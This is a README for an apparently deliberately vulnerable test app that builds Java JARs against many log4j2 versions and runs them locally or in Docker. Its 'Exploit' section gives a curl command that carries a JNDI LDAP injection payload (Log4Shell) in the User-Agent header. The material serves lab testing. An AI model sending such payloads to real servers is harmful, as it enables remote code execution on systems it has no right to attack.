# Example App for log4j2 testing purposes

### Build

You first need to build all the JAR files (if desired, test single versions see `Build JAR for single version`). 

```
sh -x ./build/build.sh
```

> NOTE: Customize for the versions you want to create


If you want to run a build manually; this is the command

```
LOG4J_VERSION=2.6.1 mvn clean assembly:assembly -DdescriptorId=jar-with-dependencies
```

You must set the LOG4J_VERSION env var or the pom is invalid


### Run

Manually running one version on a host directly: 

> NOTE: This assumes you have the proper JRE version installed!

```
PORT=8080 java -jar <jar> # You must set the PORT or it will error!
```

Running inside of a docker container (see docker-compose.yml for additional info)

```
docker-compose up [image]
```


### Exploit

Send a properly formated jdni:ldap message as your user agent, example:

```
curl 127.0.0.1:8080/ -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}'
```


### Build JAR for single version

Where the first argument is the Java version and the second is the LOG4J_VERSION.  Once built, and individual version
can be started with docker-compose via `docker-compose up log4j_1.8_2.15.0` (see docker-compose.yml for configured
versions).

```
sh -x ./build/build_one.sh 1.8 2.15.0
```
